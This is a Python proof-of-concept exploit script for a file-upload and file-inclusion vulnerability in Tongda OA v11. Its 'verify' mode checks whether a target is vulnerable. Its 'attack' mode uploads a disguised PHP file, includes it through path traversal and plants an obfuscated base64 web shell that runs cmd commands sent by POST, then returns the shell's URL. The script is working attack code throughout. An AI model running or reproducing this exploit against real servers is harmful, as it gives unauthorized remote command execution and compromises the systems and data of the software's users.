#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2020/4/26
# refer:https://forum.90sec.com/t/topic/883
# version oa v11
# app:https://cdndown.tongda2000.com/oa/2019/TDOA11.3.exe
# patch:http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe

import requests
import re
import string
import random

res = {}


def get_remote_file(str):
    ret = ""
    try:
        pattern = r'@(.*?)\|'
        res = re.findall(pattern,str)
        ret = res[0]
    except:
        print("Get upload file error!")
    return ret


def verify(target_node):
    target = target_node['target']
    url = target + '/ispirit/im/upload.php'
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}
    try :
        sess = requests.session()
        sess.headers = headers
        #sess.proxies = {'http':'127.0.0.1:8080'}
        _keyword = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        shell_content = '''
        <?php echo('{0}');
        unlink(__FILE__);
        '''.format(_keyword)
        files = {}
        files['ATTACHMENT'] = ('1.jpg', shell_content, "image/jpg")
        data = {'P':'1','DEST_UID':'123','UPLOAD_MODE':'1'}
        response_text = sess.post(url,data=data,files = files).content
        file = get_remote_file(response_text)
        path,name = file.split('_')
        payload = r'{"url":"../../../general/../attach/im/%s/%s.1.jpg"}'%(path,name)
        json_data = {'json':payload}
        url = target + '/ispirit/interface/gateway.php'
        response_text = sess.post(url, data=json_data,).content
        if _keyword in response_text:
                res['Info'] = 'FOUNDED VULNERABILTY!!!'
                res['Success'] = True
    except Exception,e:
        res['Info'] = e.message
        res['Success'] = False
    return res


def attack(target_node):
    target = target_node['target']
    url = target + '/ispirit/im/upload.php'
    res = {}
    res['Info'] = ""
    res['Success'] = False
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}
    try:
        sess = requests.session()
        sess.headers = headers
        _keyword = ':)'
        shell_content = '''
           <?php 
           $code='PD9waHAKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kX1BPU1RbYzBdKTsKJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKZWNobyAkc3Ryb3V0cHV0Owo/Pg==';
           file_put_contents('../../shell.php',base64_decode($code));
           unlink(__FILE__);
           '''
        files = {}
        files['ATTACHMENT'] = ('1.jpg', shell_content, "image/jpg")
        data = {'P': '1', 'DEST_UID': '123', 'UPLOAD_MODE': '1'}
        response_text = sess.post(url, data=data, files=files).content
        file = get_remote_file(response_text)
        path, name = file.split('_')
        payload = r'{"url":"../../../general/../attach/im/%s/%s.1.jpg"}' % (path, name)
        json_data = {'json': payload}
        url = target + '/ispirit/interface/gateway.php'
        sess.post(url, data=json_data, ).content
        url = target + '/shell.php'
        response = sess.get(url)
        if 200 == response.status_code:
            res['Info'] = 'Shell_URL:%s'%(url)
            res['Success'] = True
    except Exception as e:
        res['Info'] = e.message
        res['Success'] = False
    return res


def poc(target,mode):
    if mode == 'verify':
        res =verify(target)
    if mode == 'attack':
        res = attack(target)
    return res